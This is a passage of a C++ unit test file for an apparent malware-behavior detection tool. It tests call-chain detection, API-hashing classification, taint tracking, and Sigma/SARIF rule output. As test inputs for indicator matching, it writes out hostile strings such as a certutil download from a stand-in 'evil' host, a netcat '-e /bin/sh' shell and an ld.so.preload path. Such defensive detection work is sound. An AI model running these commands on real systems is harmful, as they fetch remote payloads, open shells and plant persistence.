        EXPECT_EQ(reg.findLibraryForSymbol("elf32_exported_fn"), "libtest32.so");
        EXPECT_EQ(reg.findLibraryForSymbol("elf64_exported_fn"), "libtest64.so");
        EXPECT_EQ(reg.findLibraryForSymbol("VirtualProtect"), "kernel32.dll");

        const auto &libs = reg.getLoadedLibraries();
        ASSERT_EQ(libs.size(), 3u);
        EXPECT_EQ(libs[0].format, BinaryFormat::ELF32);
        EXPECT_EQ(libs[1].format, BinaryFormat::ELF64);
        EXPECT_EQ(libs[2].format, BinaryFormat::CoffImportLib);

        reg.clear();
        std::filesystem::remove_all(tmp_dir);
    }

    // ===========================================================================
    // 5. CallPatternAndBehaviorRuleTest
    // ===========================================================================

    TEST(CallPatternAndBehaviorRuleTest, DetectsBehavioralChainsAndSummaryInJson) {
        CallPatternCollector collector;

        CallPatternRecord dyn_res;
        dyn_res.caller_function = "stageLoader";
        dyn_res.symbol = "GetProcAddress";
        dyn_res.library = "kernel32.dll";
        dyn_res.behavior_category = "DynamicResolution";
        dyn_res.behavior_tags = {"dynamic_resolution", "iat_evasion"};
        dyn_res.risk_score = 68;
        collector.add(dyn_res);

        CallPatternRecord alloc_rec;
        alloc_rec.caller_function = "stageLoader";
        alloc_rec.symbol = "VirtualAlloc";
        alloc_rec.library = "kernel32.dll";
        alloc_rec.behavior_category = "MemoryAllocation";
        alloc_rec.behavior_tags = {"virtual_memory_allocation"};
        alloc_rec.arg_entropy = 7.1;
        alloc_rec.has_high_entropy_literal = true;
        alloc_rec.risk_score = 72;
        collector.add(alloc_rec);

        CallPatternRecord prot_rec;
        prot_rec.caller_function = "stageLoader";
        prot_rec.symbol = "VirtualProtect";
        prot_rec.library = "kernel32.dll";
        prot_rec.behavior_category = "MemoryProtection";
        prot_rec.behavior_tags = {"rwx_violation"};
        prot_rec.risk_score = 86;
        collector.add(prot_rec);

        CallPatternRecord ind_rec;
        ind_rec.caller_function = "stageLoader";
        ind_rec.symbol = "fn_ptr";
        ind_rec.kind = "indirect";
        ind_rec.behavior_category = "IndirectCall";
        ind_rec.is_indirect_call = true;
        ind_rec.resolved_from_symbol = "VirtualProtect";
        ind_rec.risk_score = 70;
        collector.add(ind_rec);

        CallPatternRecord syscall_rec;
        syscall_rec.caller_function = "stageLoader";
        syscall_rec.symbol = "__asm_syscall";
        syscall_rec.kind = "inline_asm";
        syscall_rec.is_inline_asm = true;
        syscall_rec.behavior_category = "DirectSyscall";
        syscall_rec.behavior_tags = {"direct_syscall"};
        syscall_rec.risk_score = 92;
        collector.add(syscall_rec);

        const auto seqs = collector.buildSequences();
        ASSERT_EQ(seqs.size(), 1u);
        const auto &seq = seqs[0];
        EXPECT_GT(seq.sequence_entropy, 0.0);
        EXPECT_TRUE(hasTag(seq.detected_chains, "dynamic_resolve_and_invoke"));
        EXPECT_TRUE(hasTag(seq.detected_chains, "alloc_protect_exec_chain"));
        EXPECT_TRUE(hasTag(seq.detected_chains, "high_entropy_payload_staging"));
        EXPECT_TRUE(hasTag(seq.detected_chains, "direct_syscall_evasion"));

        const std::string json = collector.toJson();
        EXPECT_NE(json.find("\"summary\""), std::string::npos);
        EXPECT_NE(json.find("\"total_calls\": 5"), std::string::npos);
        EXPECT_NE(json.find("\"total_sequences\": 1"), std::string::npos);
        EXPECT_NE(json.find("\"max_risk_score\""), std::string::npos);
        EXPECT_NE(json.find("\"max_entropy\""), std::string::npos);
        EXPECT_NE(json.find("\"high_risk_callers\""), std::string::npos);
    }

    TEST(CallPatternAndBehaviorRuleTest, EmitsBehaviorFindingsJsonRulesAndSigmaYaml) {
        BehaviorCallObservation call_obs;
        call_obs.caller = "injectPayload";
        call_obs.symbol = "NtAllocateVirtualMemory";
        call_obs.library = "ntdll.dll";
        call_obs.kind = "inline_asm";
        call_obs.pattern = "[ntdll.dll] syscall";
        call_obs.behavior_category = "DirectSyscall";
        call_obs.behavior_tags = {"direct_syscall", "rwx_violation"};
        call_obs.risk_score = 92;
        call_obs.arg_entropy = 6.7;
        call_obs.has_high_entropy_literal = true;
        call_obs.is_inline_asm = true;
        call_obs.file = "loader.cpp";
        call_obs.line = 42;

        BehaviorSequenceObservation seq_obs;
        seq_obs.caller = "injectPayload";
        seq_obs.chain = {"VirtualAlloc", "VirtualProtect", "syscall"};
        seq_obs.behavior_chain_tags = {"memory_allocation", "rwx", "direct_syscall", "exec"};
        seq_obs.sequence_entropy = 1.58;
        seq_obs.max_arg_entropy = 6.7;
        seq_obs.caller_risk_score = 95;

        const auto findings = BehaviorRuleEmitter::analyzeFindings({call_obs}, {seq_obs}, "windows", 40, 4.5);
        ASSERT_FALSE(findings.empty());

        bool saw_syscall_seq = false;
        bool saw_rwx_seq = false;
        for (const auto &f : findings) {
            EXPECT_EQ(f.target_os, "windows");
            EXPECT_EQ(f.caller, "injectPayload");
            EXPECT_FALSE(f.mitre_techniques.empty());
            if (f.rule_id == "BEHAVIOR-SEQ-SYSCALL-004")
                saw_syscall_seq = true;
            if (f.rule_id == "BEHAVIOR-SEQ-RWX-002")
                saw_rwx_seq = true;
        }
        EXPECT_TRUE(saw_syscall_seq);
        EXPECT_TRUE(saw_rwx_seq);

        const std::string json_rules = BehaviorRuleEmitter::toJsonRules(findings, "windows");
        EXPECT_NE(json_rules.find("\"schema\": \"traceql.behavior_rules.v1\""), std::string::npos);
        EXPECT_NE(json_rules.find("\"target_os\": \"windows\""), std::string::npos);
        EXPECT_NE(json_rules.find("\"findings\""), std::string::npos);
        EXPECT_NE(json_rules.find("\"mitre_techniques\""), std::string::npos);

        const std::string sigma_yaml = BehaviorRuleEmitter::toSigmaYaml(findings, "windows");
        EXPECT_NE(sigma_yaml.find("title: "), std::string::npos);
        EXPECT_NE(sigma_yaml.find("status: experimental"), std::string::npos);
        EXPECT_NE(sigma_yaml.find("product: windows"), std::string::npos);
        EXPECT_NE(sigma_yaml.find("BehavioralIndicators|contains:"), std::string::npos);
        EXPECT_NE(sigma_yaml.find("condition: selection"), std::string::npos);
        EXPECT_NE(sigma_yaml.find("---\n"), std::string::npos);

        EXPECT_EQ(BehaviorRuleEmitter::toSigmaYaml({}, "windows"),
                  "# No behavioral risk findings exceeded thresholds.\n");
    }

    TEST(DatasetLoaderTest, LoadsMalApiJsonElasticJsonAndSigmaYamlAndMatchesBehaviorFindings) {
        const std::filesystem::path tmp_dir = std::filesystem::temp_directory_path() / "crd_dataset_test";
        std::error_code ec;
        std::filesystem::create_directories(tmp_dir, ec);

        // 1. MalAPI-style JSON
        {
            std::ofstream ofs(tmp_dir / "malapi.json");
            ofs << R"({
        "NtQueueApcThread": {
          "category": "Injection",
          "severity": "critical",
          "risk_score": 88,
          "mitre": ["T1055.004"],
          "description": "Queues an APC to a target thread"
        }
      })";
        }

        // 2. Elastic/custom sequence rule JSON
        {
            std::ofstream ofs(tmp_dir / "elastic_seq.json");
            ofs << R"({
        "rules": [
          {
            "id": "ELASTIC-SEQ-001",
            "title": "Section Mapping Injection Chain",
            "severity": "critical",
            "risk_score": 94,
            "target_os": "windows",
            "sequence": ["NtCreateSection", "NtMapViewOfSection"],
            "mitre": ["T1055.012"]
          }
        ]
      })";
        }

        // 3. Sigma YAML rule
        {
            std::ofstream ofs(tmp_dir / "sigma_memfd.yml");
            ofs << "title: Linux Memfd Execution\n"
                   "id: SIGMA-LINUX-MEMFD-001\n"
                   "level: high\n"
                   "tags:\n"
                   "  - attack.t1620\n"
                   "detection:\n"
                   "  selection:\n"
                   "    - 'memfd_create'\n";
        }

        DatasetLoader loader;
        const size_t loaded = loader.loadDirectory(tmp_dir.string());
        EXPECT_GE(loaded, 3u);
        EXPECT_FALSE(loader.matchSymbol("NtQueueApcThread").empty());
        EXPECT_FALSE(loader.matchSymbol("memfd_create").empty());

        std::vector<BehaviorCallObservation> calls;
        BehaviorCallObservation c1;
        c1.caller = "injectViaApc";
        c1.symbol = "NtCreateSection";
        calls.push_back(c1);

        BehaviorCallObservation c2;
        c2.caller = "injectViaApc";
        c2.symbol = "NtMapViewOfSection";
        calls.push_back(c2);

        BehaviorCallObservation c3;
        c3.caller = "injectViaApc";
        c3.symbol = "NtQueueApcThread";
        calls.push_back(c3);

        const auto findings = BehaviorRuleEmitter::analyzeFindings(calls, {}, "windows", 40, 6.8, &loader);
        bool saw_malapi = false;
        bool saw_seq = false;
        for (const auto &f : findings) {
            if (f.rule_id == "DS-API-NtQueueApcThread")
                saw_malapi = true;
            if (f.rule_id == "ELASTIC-SEQ-001")
                saw_seq = true;
        }
        EXPECT_TRUE(saw_malapi);
        EXPECT_TRUE(saw_seq);

        std::filesystem::remove_all(tmp_dir, ec);
    }

    TEST(DatasetLoaderTest, LoadsRealBundledDatasetsFromDisk) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir)) << "Missing bundled datasets directory: " << datasets_dir;

        DatasetLoader loader;
        const size_t loaded = loader.loadDirectory(datasets_dir.string());
        EXPECT_GT(loaded, 0u);
        EXPECT_GE(loader.apiCount(), 500u);
        EXPECT_GE(loader.ruleCount(), 30u);

        EXPECT_FALSE(loader.matchSymbol("VirtualAllocEx").empty());
        EXPECT_FALSE(loader.matchSymbol("Certutil.exe").empty());
        EXPECT_FALSE(loader.matchSymbol("SetWindowsHookEx").empty());
        EXPECT_FALSE(loader.matchSymbol("ptrace").empty());
        EXPECT_FALSE(loader.matchSymbol("memfd_create").empty());
        EXPECT_FALSE(loader.matchSymbol("personality").empty());
    }

    TEST(DatasetLoaderTest, DoesNotFalsePositiveOnCppStdAndEngineMethods) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir)) << "Missing bundled datasets directory: " << datasets_dir;

        DatasetLoader loader;
        const size_t loaded = loader.loadDirectory(datasets_dir.string());
        EXPECT_GT(loaded, 0u);

        // C++ standard library and engine namespaced methods must never match OS/CLI indicators.
        EXPECT_TRUE(loader.matchSymbol("std::basic_string::find").empty());
        EXPECT_TRUE(loader.matchSymbol("std::string::find").empty());
        EXPECT_TRUE(loader.matchSymbol("bgfx::touch").empty());
        EXPECT_TRUE(loader.matchSymbol("find").empty());
        EXPECT_TRUE(loader.matchSymbol("touch").empty());

        // Global-namespace prefix (::foo) still resolves to genuine OS API symbols.
        EXPECT_FALSE(loader.matchSymbol("::VirtualAllocEx").empty());

        std::vector<BehaviorCallObservation> calls;
        for (const char *sym : {"std::basic_string::find", "std::string::find", "bgfx::touch"}) {
            BehaviorCallObservation obs;
            obs.caller = "forma::Canvas::draw";
            obs.symbol = sym;
            calls.push_back(std::move(obs));
        }

        const auto findings = BehaviorRuleEmitter::analyzeFindings(calls, {}, "linux", 40, 6.8, &loader);
        EXPECT_TRUE(findings.empty());
    }

    TEST(BehaviorClassifierTest, ClassifiesApiHashingAndCryptoConstants) {
        // Standalone crc32_poly without loop or pointer indirection stays Benign (no false positive).
        BehaviorFeatures standalone;
        standalone.target_os = TargetOS::Linux;
        standalone.call_kind = "direct";
        standalone.caller_function = "computeChecksum";
        standalone.has_crypto_or_hash_constant = true;
        standalone.crypto_hash_tags = {"crc32_poly"};
        standalone.inside_loop = false;
        standalone.pointer_indirection_depth = 0;

        const auto standalone_res = BehaviorClassifier::classify(standalone);
        EXPECT_EQ(standalone_res.primary_category, BehaviorCategory::Benign);
        EXPECT_EQ(standalone_res.risk_score, 20u);
        EXPECT_TRUE(hasTag(standalone_res.tags, "crc32_poly"));

        // ror13_hash / fnv1a_hash inside a loop with pointer indirection classifies as DynamicResolution.
        BehaviorFeatures api_hash;
        api_hash.target_os = TargetOS::Windows;
        api_hash.call_kind = "direct";
        api_hash.caller_function = "resolveExportByHash";
        api_hash.has_crypto_or_hash_constant = true;
        api_hash.crypto_hash_tags = {"ror13_hash", "fnv1a_hash"};
        api_hash.inside_loop = true;
        api_hash.pointer_indirection_depth = 1;

        const auto hash_res = BehaviorClassifier::classify(api_hash);
        EXPECT_EQ(hash_res.primary_category, BehaviorCategory::DynamicResolution);
        EXPECT_GE(hash_res.risk_score, 68u);
        EXPECT_TRUE(hasTag(hash_res.tags, "api_hashing"));
        EXPECT_TRUE(hasTag(hash_res.tags, "ror13_hash"));
        EXPECT_TRUE(hasTag(hash_res.tags, "fnv1a_hash"));

        BehaviorCallObservation obs;
        obs.caller = "resolveExportByHash";
        obs.symbol = "walkExportTable";
        obs.kind = "direct";
        obs.behavior_category = getBehaviorCategoryName(hash_res.primary_category);
        obs.behavior_tags = hash_res.tags;
        obs.risk_score = hash_res.risk_score;
        obs.file = "resolver.cpp";
        obs.line = 27;
        obs.column = 5;

        const auto findings = BehaviorRuleEmitter::analyzeFindings({obs}, {}, "windows", 40, 6.8);
        bool saw_hash_rule = false;
        for (const auto &f : findings) {
            if (f.rule_id == "BEHAVIOR-CALL-HASH-008") {
                saw_hash_rule = true;
                break;
            }
        }
        EXPECT_TRUE(saw_hash_rule);
    }

    TEST(BehaviorClassifierTest, EscalatesRiskForAutoInitEntrypoints) {
        BehaviorFeatures base_features;
        base_features.target_os = TargetOS::Linux;
        base_features.call_kind = "indirect";
        base_features.resolved_from_symbol = true;
        base_features.caller_function = "normalHelper";

        const auto base_res = BehaviorClassifier::classify(base_features);
        ASSERT_NE(base_res.primary_category, BehaviorCategory::Benign);

        BehaviorFeatures auto_init_features = base_features;
        auto_init_features.caller_function = "earlyInitHook";
        auto_init_features.is_auto_init_entrypoint = true;
        auto_init_features.entrypoint_kind = "constructor";

        const auto init_res = BehaviorClassifier::classify(auto_init_features);
        EXPECT_GT(init_res.risk_score, base_res.risk_score);
        EXPECT_TRUE(hasTag(init_res.tags, "auto_init_entrypoint"));
        EXPECT_TRUE(hasTag(init_res.tags, "constructor"));
    }

    TEST(CallPatternAndBehaviorRuleTest, DetectsTransitiveIntraTuCallGraphChains) {
        CallPatternCollector collector;

        CallPatternRecord alloc_rec;
        alloc_rec.caller_function = "helperAlloc";
        alloc_rec.symbol = "VirtualAlloc";
        alloc_rec.library = "kernel32.dll";
        alloc_rec.kind = "call";
        alloc_rec.behavior_category = "MemoryAllocation";
        alloc_rec.behavior_tags = {"virtual_memory_allocation"};
        alloc_rec.risk_score = 45;
        collector.add(std::move(alloc_rec));

        CallPatternRecord protect_rec;
        protect_rec.caller_function = "helperProtect";
        protect_rec.symbol = "VirtualProtect";
        protect_rec.library = "kernel32.dll";
        protect_rec.kind = "call";
        protect_rec.behavior_category = "MemoryProtection";
        protect_rec.behavior_tags = {"memory_protection", "rwx_protection"};
        protect_rec.risk_score = 80;
        collector.add(std::move(protect_rec));

        CallPatternRecord call_alloc;
        call_alloc.caller_function = "runner";
        call_alloc.symbol = "helperAlloc";
        call_alloc.kind = "call";
        call_alloc.is_intra_tu_call = true;
        call_alloc.risk_score = 10;
        collector.add(std::move(call_alloc));

        CallPatternRecord call_protect;
        call_protect.caller_function = "runner";
        call_protect.symbol = "helperProtect";
        call_protect.kind = "call";
        call_protect.is_intra_tu_call = true;
        call_protect.risk_score = 10;
        collector.add(std::move(call_protect));

        CallPatternRecord call_exec;
        call_exec.caller_function = "runner";
        call_exec.symbol = "fn_ptr";
        call_exec.kind = "indirect";
        call_exec.is_indirect_call = true;
        call_exec.behavior_category = "IndirectCall";
        call_exec.behavior_tags = {"indirect_call"};
        call_exec.risk_score = 55;
        collector.add(std::move(call_exec));

        const auto seqs = collector.buildSequences();
        const FunctionCallSequence *runner_seq = nullptr;
        for (const auto &s : seqs) {
            if (s.caller_function == "runner") {
                runner_seq = &s;
                break;
            }
        }
        ASSERT_NE(runner_seq, nullptr);
        EXPECT_TRUE(hasTag(runner_seq->detected_chains, "alloc_protect_exec_chain"));
        EXPECT_TRUE(hasTag(runner_seq->transitive_callees, "helperAlloc"));
        EXPECT_TRUE(hasTag(runner_seq->transitive_callees, "helperProtect"));
    }

    TEST(CallPatternAndBehaviorRuleTest, EmitsValidSarif210Output) {
        BehaviorFinding finding;
        finding.rule_id = "BEHAVIOR-CALL-HASH-008";
        finding.title = "API Hashing or Cryptographic Constant in Dynamic Context";
        finding.severity = "high";
        finding.target_os = "windows";
        finding.caller = "resolveExportByHash";
        finding.file = "src/loader.cpp";
        finding.line = 42;
        finding.column = 13;
        finding.indicators = {"walkExportTable"};
        finding.mitre_techniques = {"T1027", "T1027.007", "T1106"};
        finding.risk_score = 68;
        finding.description = "Call site uses API-hashing or cryptographic constants in a dynamic context.";

        const std::string sarif = BehaviorRuleEmitter::toSarif({finding}, "windows");
        EXPECT_NE(sarif.find("\"version\": \"2.1.0\""), std::string::npos);
        EXPECT_NE(sarif.find("\"$schema\""), std::string::npos);
        EXPECT_NE(sarif.find("\"runs\""), std::string::npos);
        EXPECT_NE(sarif.find("\"driver\""), std::string::npos);
        EXPECT_NE(sarif.find("\"rules\""), std::string::npos);
        EXPECT_NE(sarif.find("\"results\""), std::string::npos);
        EXPECT_NE(sarif.find("\"physicalLocation\""), std::string::npos);
        EXPECT_NE(sarif.find("\"startLine\": 42"), std::string::npos);
        EXPECT_NE(sarif.find("\"startColumn\": 13"), std::string::npos);
    }

    TEST(TaintTrackerTest, TracksAliasesAndExecFlow) {
        TaintTracker tracker;
        const uintptr_t buf = 0x1001;
        const uintptr_t blob = 0x1002;
        const uintptr_t alias = 0x1003;

        tracker.addTaint(buf, TaintKind::MemoryAlloc, "VirtualAlloc");
        tracker.addTaint(blob, TaintKind::HighEntropyBlob, "encoded_payload");
        tracker.propagateBinary(buf, buf, blob, "memcpy_payload");
        tracker.assignAlias(alias, buf, "alias_ptr");

        EXPECT_TRUE(tracker.hasTaint(alias, TaintKind::MemoryAlloc));
        EXPECT_TRUE(tracker.hasTaint(alias, TaintKind::HighEntropyBlob));
        EXPECT_FALSE(tracker.hasTaintedExecFlow(alias));

        tracker.addTaint(alias, TaintKind::ExecProtect, "VirtualProtect");
        EXPECT_TRUE(tracker.hasTaintedExecFlow(alias));
        EXPECT_TRUE(tracker.hasTaint(alias, TaintKind::ExecProtect));
    }

    TEST(BehaviorClassifierTest, ClassifiesStackStringsCffAndTaintedExecFlow) {
        // 1. Stack string obfuscation inside loop -> "stack_string_obfuscation" and elevated risk.
        BehaviorFeatures stack_base;
        stack_base.target_os = TargetOS::Windows;
        stack_base.call_kind = "direct";
        stack_base.inside_loop = true;
        const auto stack_base_res = BehaviorClassifier::classify(stack_base);

        BehaviorFeatures stack_features = stack_base;
        stack_features.has_stack_string = true;
        stack_features.reconstructed_stack_strings = {"VirtualAlloc"};
        const auto stack_res = BehaviorClassifier::classify(stack_features);
        EXPECT_TRUE(hasTag(stack_res.tags, "stack_string_obfuscation"));
        EXPECT_GT(stack_res.risk_score, stack_base_res.risk_score);
        EXPECT_GE(stack_res.risk_score, 55u);

        // 2. Control-flow flattening dispatcher paired with high-entropy literal -> "control_flow_flattening" and
        // elevated risk.
        BehaviorFeatures cff_base;
        cff_base.target_os = TargetOS::Linux;
        cff_base.call_kind = "direct";
        cff_base.has_high_entropy_literal = true;
        const auto cff_base_res = BehaviorClassifier::classify(cff_base);

        BehaviorFeatures cff_features = cff_base;
        cff_features.has_cff_dispatcher = true;
        const auto cff_res = BehaviorClassifier::classify(cff_features);
        EXPECT_TRUE(hasTag(cff_res.tags, "control_flow_flattening"));
        EXPECT_GT(cff_res.risk_score, cff_base_res.risk_score);
        EXPECT_GE(cff_res.risk_score, 62u);

        // 3. Tainted buffer-to-exec flow on MemoryProtection -> "tainted_buffer_exec_flow" and elevated risk.
        BehaviorFeatures prot_base;
        prot_base.target_os = TargetOS::Linux;
        prot_base.call_kind = "direct";
        prot_base.return_type = "int";
        prot_base.param_types = {"void*", "size_t", "int"};
        prot_base.numeric_constants = {0x05ULL}; // PROT_READ | PROT_EXEC
        const auto prot_base_res = BehaviorClassifier::classify(prot_base);
        ASSERT_EQ(prot_base_res.primary_category, BehaviorCategory::MemoryProtection);

        BehaviorFeatures prot_tainted = prot_base;
        prot_tainted.has_tainted_exec_flow = true;
        const auto prot_tainted_res = BehaviorClassifier::classify(prot_tainted);
        EXPECT_EQ(prot_tainted_res.primary_category, BehaviorCategory::MemoryProtection);
        EXPECT_TRUE(hasTag(prot_tainted_res.tags, "tainted_buffer_exec_flow"));
        EXPECT_GT(prot_tainted_res.risk_score, prot_base_res.risk_score);
    }

    TEST(DatasetLoaderTest, EvaluatesSigmaBooleanConditionsAndRegex) {
        const std::filesystem::path temp_dir = std::filesystem::temp_directory_path() / "crd_sigma_bool_regex_test";
        std::filesystem::create_directories(temp_dir);
        const std::filesystem::path rule_path = temp_dir / "bool_regex_rule.yml";

        {
            std::ofstream out(rule_path);
            ASSERT_TRUE(out.is_open());
            out << "title: VirtualAlloc and WriteProcess Regex Rule\n"
                << "id: TEST-SIGMA-BOOL-RE-001\n"
                << "level: high\n"
                << "product: windows\n"
                << "detection:\n"
                << "  selection_a:\n"
                << "    ApiName:\n"
                << "      - VirtualAlloc\n"
                << "  selection_b:\n"
                << "    ApiName|re:\n"
                << "      - ^WriteProcess.*$\n"
                << "  filter:\n"
                << "    ApiName:\n"
                << "      - benign_test_helper\n"
                << "  condition: (selection_a and selection_b) and not filter\n";
        }

        DatasetLoader loader;
        EXPECT_GT(loader.loadFile(rule_path.string()), 0u);

        const auto positive = loader.matchIndicators({"VirtualAlloc", "WriteProcessMemory"});
        ASSERT_EQ(positive.size(), 1u);
        EXPECT_EQ(positive[0].rule_id, "TEST-SIGMA-BOOL-RE-001");

        const auto filtered = loader.matchIndicators({"VirtualAlloc", "WriteProcessMemory", "benign_test_helper"});
        EXPECT_TRUE(filtered.empty());

        std::error_code ec;
        std::filesystem::remove_all(temp_dir, ec);
    }

    TEST(ProjectAggregatorTest, MergesMultiTuPatternsAndDetectsCrossTuChains) {
        const std::filesystem::path temp_dir = std::filesystem::temp_directory_path() / "crd_project_aggregator_test";
        std::filesystem::create_directories(temp_dir);
        const std::filesystem::path tu_a_path = temp_dir / "tu_a.json";
        const std::filesystem::path tu_b_path = temp_dir / "tu_b.json";

        {
            CallPatternCollector tu_a;
            CallPatternRecord alloc_rec;
            alloc_rec.caller_function = "allocStep";
            alloc_rec.symbol = "VirtualAlloc";
            alloc_rec.library = "kernel32.dll";
            alloc_rec.kind = "call";
            alloc_rec.behavior_category = "MemoryAllocation";
            alloc_rec.behavior_tags = {"virtual_memory_allocation"};
            alloc_rec.risk_score = 45;
            tu_a.add(std::move(alloc_rec));
            ASSERT_TRUE(tu_a.writeJsonFile(tu_a_path.string()));
        }

        {
            CallPatternCollector tu_b;
            CallPatternRecord protect_rec;
            protect_rec.caller_function = "protectStep";
            protect_rec.symbol = "VirtualProtect";
            protect_rec.library = "kernel32.dll";
            protect_rec.kind = "call";
            protect_rec.behavior_category = "MemoryProtection";
            protect_rec.behavior_tags = {"memory_protection", "rwx_violation"};
            protect_rec.risk_score = 86;
            tu_b.add(std::move(protect_rec));

            CallPatternRecord call_alloc;
            call_alloc.caller_function = "mainRunner";
            call_alloc.symbol = "allocStep";
            call_alloc.kind = "call";
            call_alloc.risk_score = 10;
            tu_b.add(std::move(call_alloc));

            CallPatternRecord call_protect;
            call_protect.caller_function = "mainRunner";
            call_protect.symbol = "protectStep";
            call_protect.kind = "call";
            call_protect.is_intra_tu_call = true;
            call_protect.risk_score = 10;
            tu_b.add(std::move(call_protect));

            CallPatternRecord call_exec;
            call_exec.caller_function = "mainRunner";
            call_exec.symbol = "fn_ptr";
            call_exec.kind = "indirect";
            call_exec.is_indirect_call = true;
            call_exec.behavior_category = "IndirectCall";
            call_exec.behavior_tags = {"indirect_call"};
            call_exec.risk_score = 55;
            tu_b.add(std::move(call_exec));

            ASSERT_TRUE(tu_b.writeJsonFile(tu_b_path.string()));
        }

        ProjectAggregator aggregator;
        ASSERT_TRUE(aggregator.loadPatternJsonFile(tu_a_path.string()));
        ASSERT_TRUE(aggregator.loadPatternJsonFile(tu_b_path.string()));

        const CallPatternCollector merged = aggregator.buildMergedCollector();
        const auto seqs = merged.buildSequences();
        const FunctionCallSequence *main_seq = nullptr;
        for (const auto &s : seqs) {
            if (s.caller_function == "mainRunner") {
                main_seq = &s;
                break;
            }
        }
        ASSERT_NE(main_seq, nullptr);
        EXPECT_TRUE(hasTag(main_seq->detected_chains, "alloc_protect_exec_chain"));
        EXPECT_TRUE(hasTag(main_seq->transitive_callees, "allocStep"));
        EXPECT_TRUE(hasTag(main_seq->transitive_callees, "protectStep"));

        std::error_code ec;
        std::filesystem::remove_all(temp_dir, ec);
    }

    TEST(DatasetLoaderTest, LoadsAll44DatasetFilesWithNonZeroEntriesAndMatchesIndicators) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir)) << "Missing bundled datasets directory: " << datasets_dir;

        std::vector<std::filesystem::path> dataset_files;
        for (const auto &entry : std::filesystem::recursive_directory_iterator(datasets_dir)) {
            if (!entry.is_regular_file()) {
                continue;
            }
            const std::string ext = entry.path().extension().string();
            if (ext == ".json" || ext == ".toml" || ext == ".yml" || ext == ".yaml") {
                dataset_files.push_back(entry.path());
            }
        }
        std::sort(dataset_files.begin(), dataset_files.end());

        ASSERT_GE(dataset_files.size(), 44u);

        size_t zero_count_files = 0;
        for (const auto &file_path : dataset_files) {
            DatasetLoader single_loader;
            const size_t loaded = single_loader.loadFile(file_path.string());
            if (loaded == 0) {
                ++zero_count_files;
            }
            EXPECT_GT(loaded, 0u) << "Dataset file loaded 0 entries/rules: " << file_path;
            EXPECT_EQ(single_loader.loadedFileCount(), 1u) << "File not recorded: " << file_path;
        }
        EXPECT_EQ(zero_count_files, 0u);

        DatasetLoader loader;
        const size_t total_loaded = loader.loadDirectory(datasets_dir.string());
        EXPECT_GT(total_loaded, 0u);
        EXPECT_GE(loader.loadedFileCount(), 44u);
        EXPECT_GE(loader.loadedFiles().size(), 44u);

        // Real LOLBAS / Sigma / Elastic indicators should match.
        EXPECT_FALSE(loader.matchIndicators({"certutil.exe -urlcache -split -f"}).empty());
        EXPECT_FALSE(loader.matchIndicators({"/etc/ld.so.preload"}).empty());
        EXPECT_FALSE(loader.matchIndicators({"/usr/bin/nc -e /bin/sh"}).empty());

        // Clean C++ / Forma strings must not trigger false positives.
        EXPECT_TRUE(loader.matchIndicators({"Hello Forma"}).empty());
        EXPECT_TRUE(loader.matchIndicators({"bgfx::touch"}).empty());
    }

    TEST(CallPatternAndBehaviorRuleTest, ForwardsArgLiteralsToDatasetMatching) {
        const std::filesystem::path datasets_dir =
            std::filesystem::path(__FILE__).parent_path().parent_path() / "datasets";
        ASSERT_TRUE(std::filesystem::exists(datasets_dir)) << "Missing bundled datasets directory: " << datasets_dir;

        DatasetLoader loader;
        ASSERT_GT(loader.loadDirectory(datasets_dir.string()), 0u);
        ASSERT_EQ(loader.loadedFileCount(), 44u);

        BehaviorCallObservation win_obs;
        win_obs.caller = "runStagedCommand";
        win_obs.symbol = "system";
        win_obs.kind = "call";
        win_obs.arg_literals = {"certutil.exe -urlcache -f http://evil/x"};

        const auto win_findings = BehaviorRuleEmitter::analyzeFindings({win_obs}, {}, "windows", 40, 6.8, &loader);
        EXPECT_FALSE(win_findings.empty());

        BehaviorCallObservation lnx_obs;
        lnx_obs.caller = "installPreload";
        lnx_obs.symbol = "popen";
        lnx_obs.kind = "call";
        lnx_obs.arg_literals = {"/etc/ld.so.preload"};

        const auto lnx_findings = BehaviorRuleEmitter::analyzeFindings({lnx_obs}, {}, "linux", 40, 6.8, &loader);
        ASSERT_FALSE(lnx_findings.empty());
        bool matched_ld_preload = false;
        for (const auto &f : lnx_findings) {
            if (f.rule_id == "7e3c4651-c347-40c4-b1d4-d48590fdf684" || hasTag(f.indicators, "/etc/ld.so.preload")) {
                matched_ld_preload = true;
                break;
            }
        }
        EXPECT_TRUE(matched_ld_preload);
    }

    TEST(TaintTrackerTest, FunctionSummaryTableRecordsAndPropagatesInterproceduralTaint) {
        FunctionSummaryTable table;
        EXPECT_EQ(table.size(), 0u);
        EXPECT_EQ(table.findSummary("helperAlloc"), nullptr);

        FunctionTaintSummary alloc_summary;
        alloc_summary.return_taint_mask = static_cast<uint32_t>(TaintKind::MemoryAlloc);
        alloc_summary.origin_symbol = "VirtualAlloc";
        table.recordSummary("helperAlloc", std::move(alloc_summary));

        FunctionTaintSummary copy_summary;
        copy_summary.param_to_return = {0};
        copy_summary.origin_symbol = "helperCopy";
        table.recordSummary("helperCopy", std::move(copy_summary));

        FunctionTaintSummary exec_summary;
        exec_summary.param_sinks = {0};
        exec_summary.origin_symbol = "VirtualProtect";
        table.recordSummary("helperExec", std::move(exec_summary));

        EXPECT_EQ(table.size(), 3u);
        EXPECT_EQ(table.findSummary("missingHelper"), nullptr);

        const FunctionTaintSummary *alloc_found = table.findSummary("helperAlloc");
        ASSERT_NE(alloc_found, nullptr);
        EXPECT_NE(alloc_found->return_taint_mask & TaintKind::MemoryAlloc, 0u);
        EXPECT_EQ(alloc_found->origin_symbol, "VirtualAlloc");

        const FunctionTaintSummary *copy_found = table.findSummary("helperCopy");
        ASSERT_NE(copy_found, nullptr);
        ASSERT_EQ(copy_found->param_to_return.size(), 1u);
        EXPECT_EQ(copy_found->param_to_return[0], 0u);

        const FunctionTaintSummary *exec_found = table.findSummary("helperExec");
        ASSERT_NE(exec_found, nullptr);
        ASSERT_EQ(exec_found->param_sinks.size(), 1u);
        EXPECT_EQ(exec_found->param_sinks[0], 0u);

        // Propagate inter-procedural summary taint through TaintTracker.
        TaintTracker tracker;
        constexpr uintptr_t kAllocBuf = 0x3001;
        constexpr uintptr_t kForwardedBuf = 0x3002;

